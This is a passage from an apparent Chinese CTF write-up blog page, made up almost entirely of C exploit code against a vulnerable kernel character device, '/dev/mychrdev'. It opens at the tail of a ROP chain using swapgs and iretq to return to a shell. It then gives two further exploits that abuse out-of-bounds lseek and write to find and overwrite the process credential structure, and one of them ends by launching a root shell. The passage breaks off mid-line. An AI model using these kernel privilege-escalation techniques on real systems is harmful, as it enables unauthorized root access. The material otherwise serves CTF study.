class="token punctuation">]</span><span class="token operator">=</span>swapgs_fq_bp_ret<span class="token punctuation">;</span>    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>iretq<span class="token punctuation">;</span>    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>shell<span class="token punctuation">;</span>    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_cs<span class="token punctuation">;</span>    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rflags<span class="token punctuation">;</span>    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_sp<span class="token punctuation">;</span>    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_ss<span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span>rop<span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h2><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;pthread.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token comment" spellcheck="true">// #include &lt;linux/fs.h></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;time.h></span></span>size_t user_cs<span class="token punctuation">,</span> user_ss<span class="token punctuation">,</span> user_rflags<span class="token punctuation">,</span> user_sp<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 保存用户态寄存器状态</span>size_t startup_64<span class="token punctuation">,</span>prepare_kernel_cred<span class="token punctuation">,</span>commit_creds<span class="token punctuation">,</span>offset<span class="token punctuation">,</span>canary<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">save_status</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">__asm__</span><span class="token punctuation">(</span> <span class="token string">"mov user_cs, cs;"</span>            <span class="token string">"mov user_ss, ss;"</span>            <span class="token string">"mov user_sp, rsp;"</span>            <span class="token string">"pushf;"</span>            <span class="token string">"pop user_rflags;"</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> fd<span class="token punctuation">;</span>    size_t buf<span class="token punctuation">[</span><span class="token number">0x10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>    size_t buf2<span class="token punctuation">[</span><span class="token number">8192</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>    size_t store <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">;</span>    buf2<span class="token punctuation">[</span><span class="token number">8192</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffffffffffff</span> <span class="token punctuation">;</span>    size_t buf3<span class="token punctuation">[</span><span class="token number">0x10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>    buf3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6262626262626262</span> <span class="token punctuation">;</span>    size_t buf4<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// printf( "addr:%p\n" ,&amp;buf);</span>    <span class="token keyword">int</span> size<span class="token punctuation">;</span>    fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"dev/mychrdev"</span><span class="token punctuation">,</span>O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span> <span class="token string">"come to write!"</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token number">0x1111</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">5</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"0x%llx\n"</span><span class="token punctuation">,</span>buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 不停的扩大 mydata + 0x10008 的值</span>    <span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span>buf2<span class="token punctuation">,</span><span class="token number">0x10000</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">lseek</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">0x10000</span><span class="token punctuation">,</span>SEEK_CUR<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span>buf2<span class="token punctuation">,</span><span class="token number">0x10000</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment" spellcheck="true">// 0x0000000000000000      0x0000000000010008</span>    <span class="token function">lseek</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">0x10000</span><span class="token punctuation">,</span>SEEK_CUR<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span>buf2<span class="token punctuation">,</span><span class="token number">0x10000</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">lseek</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">0x10000</span><span class="token punctuation">,</span>SEEK_CUR<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 0x30000</span>    <span class="token function">lseek</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token number">0x10001</span><span class="token punctuation">,</span>SEEK_SET<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// 溢出 ,写 0x6161616161616161</span><span class="token comment" spellcheck="true">// buf2[0] = 0x0000000000000000 ;</span>    buf2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span> <span class="token number">0x6d6</span> <span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// buf2[0] = - 0x7d8 ;       // 0x280</span>    buf2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x111111111111</span> <span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// size_t full = 0xffffffffffffffff ;</span>    <span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span>buf2<span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// 任意写 mydata + 0x10000 和 mydata + 0x10008 处的值</span>    <span class="token comment" spellcheck="true">// lseek(fd, 0 ,SEEK_SET);</span>    <span class="token comment" spellcheck="true">// sleep( 1 );</span>    <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span>buf4<span class="token punctuation">,</span><span class="token number">0x98</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// sleep( 1 );</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"read:0x%lx\n"</span><span class="token punctuation">,</span>buf4<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 爆破一个字节,读出cred结构体的位置</span>    size_t cred_addr <span class="token operator">=</span> buf4<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">lseek</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token number">0x5d568</span><span class="token punctuation">,</span>SEEK_CUR<span class="token punctuation">)</span><span class="token punctuation">;</span>          size_t cred_offset <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">;</span>    size_t fuck<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>    fuck<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>size_t<span class="token punctuation">)</span><span class="token punctuation">(</span>cred_addr <span class="token operator">-</span> <span class="token number">0xffff88800db40000</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    fuck<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x111111111111</span> <span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span>fuck<span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">lseek</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">0x80000</span><span class="token punctuation">,</span>SEEK_CUR<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// lseek 归零，为任意写做准备</span>    size_t fuck_cred<span class="token punctuation">[</span><span class="token number">0x10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    cred_offset <span class="token operator">=</span> cred_addr <span class="token operator">-</span> <span class="token number">0xffff88800dbc0000</span> <span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*]fuck cred"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span>fuck_cred<span class="token punctuation">,</span> <span class="token number">0x28</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>                             <span class="token comment" spellcheck="true">// 任意写，fuck cred</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*]done"</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo \"root shell\" &amp;&amp; /bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 0xffffffffc0000000</span><span class="token comment" spellcheck="true">// 0xffffffff81000000</span><span class="token comment" spellcheck="true">// .text: 0000000000000145                 mov     rdx, cs:mydata</span><span class="token comment" spellcheck="true">// mydata: 0xffff88800db40000</span><span class="token comment" spellcheck="true">// 0xffffffffc00002a7</span><span class="token comment" spellcheck="true">// struct file ： 0xffff88800daf3a00</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="exp3"><a href="#exp3" class="headerlink" title="exp3"></a>exp3</h2><p>exp来自队里的师傅</p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/prctl.h></span></span>size_t heap<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">id</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"uid:%d\n"</span><span class="token punctuation">,</span> <span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/mychrdev"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>    u_char buf<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">0x1111</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    u_char <span class="token operator">*</span>p <span class="token operator">=</span> buf<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>    p <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span>    p <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">0x10</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"0x%x\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>    p <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"0x%x\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>    p <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>size_t <span class="token operator">*</span><span class="token punctuation">)</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>    heap <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>size_t <span class="token operator">*</span><span class="token punctuation">)</span>p<span class="token punctuation">;</span>    <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">print_hex</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> size_t len<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>len <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"0x%lx"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>size_t <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>buf <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">%</span> <span class="token number">16</span><span class="token punctuation">)</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">id</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/mychrdev"</span><span class="token punctuation">,</span> O_WRONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>    u_char buf<span class="token punctuation">[</span><span class="token number">0x10010</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">long</span> n <span class="token operator">=</span> <span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x10000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">lseek</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    size_t addr <span class="token operator">=</span> <span class="token number">0x10000</span><span class="token punctuation">,</span> pre_addr <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    size_t cred<span class="token punctuation">,</span> real_cred<span class="token punctuation">,</span> target_addr<span class="token punctuation">;</span>    <span class="token keyword">char</span> target<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"try2findmep4nda"</span><span class="token punctuation">;</span>    <span class="token function">prctl</span><span class="token punctuation">(</span>PR_SET_NAME<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span> pre_addr <span class="token operator">=</span> addr<span class="token punctuation">,</span> addr <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">0x10000</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// printf("pre_addr:0x%lX\n",heap-pre_addr);</span>        <span class="token comment" spellcheck="true">// printf("addr:0x%lX\n", heap-addr);</span>        size_t pos <span class="token operator">=</span> pre_addr <span class="token operator">+</span> <span class="token number">0x10001</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// printf("pos:0x%lx\n", pos);</span>        fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/mychrdev"</span><span class="token punctuation">,</span> O_WRONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> <span class="token function">lseek</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> pos<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// printf("0x%x\n", n);</span>        <span class="token comment" spellcheck="true">// *(size_t *)buf = -0x10000LL;</span>        <span class="token operator">*</span><span class="token punctuation">(</span>size_t <span class="token operator">*</span><span class="token punctuation">)</span>buf <span class="token operator">=</span> <span class="token operator">-</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span>addr <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">*</span><span class="token punctuation">(</span>size_t <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>buf <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x100000000000LL</span><span class="token punctuation">;</span>        n <span class="token operator">=</span> <span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// printf("%x\n\n", n);</span>        <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>        fd <span class="token operator">=</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/mychrdev"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>        n <span class="token operator">=</span> <span class="token function">lseek</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// printf("%d\n", n);</span>        n <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x10000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// printf("%d\n\n", n);</span>        <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            u_int result <span class="token operator">=</span> <span class="token function">memmem</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0x10000</span><span class="token punctuation">,</span> target<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                size_t temp <span class="token operator">=</span> buf <span class="token operator">+</span> result <span class="token operator">-</span> <span class="token punctuation">(</span>u_int<span class="token punctuation">)</span>buf<span class="token punctuation">;</span>                real_cred <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>size_t <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>temp <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// target_addr = heap - addr + result - (u_int)(buf);</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    pre_addr<span class="token operator">=</span>addr<span class="token punctuation">;</span>    size_t mod<span class="token operator">=</span><span class="token punctuation">(</span>real_cred<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">;</span>    addr<span class="token operator">=</span>heap<span class="token operator">-</span>mod<span class="token punctuation">;</span>    size_t p_pos<span class="token operator">=</span>real_cred<span class="token operator">-</span>mod<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// printf("%p\n", pre_addr);</span>    <span class="token comment" spellcheck="true">// printf("%p\n", addr);</span>    <span class="token comment" spellcheck="true">// printf("%p\n", mod);</span>    <span class="token comment" spellcheck="true">// printf("%p\n", p_pos);</span>    fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/mychrdev"</span><span class="token punctuation">,</span> O_WRONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>    size_t pos <span class="token operator">=</span> pre_addr <span class="token operator">+</span> <span class="token number">0x10001</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> n <span class="token operator">=</span> <span class="token function">lseek</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> pos<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>size_t <span class="token operator">*</span><span class="token punctuation">)</span>buf <span class="token operator">=</span> <span class="token operator">-</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span>addr <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>size_t <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>buf <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x100000000000LL</span><span class="token punctuation">;</span>    n <span class="token operator">=</span> <span class="token function">write</span><span class="token 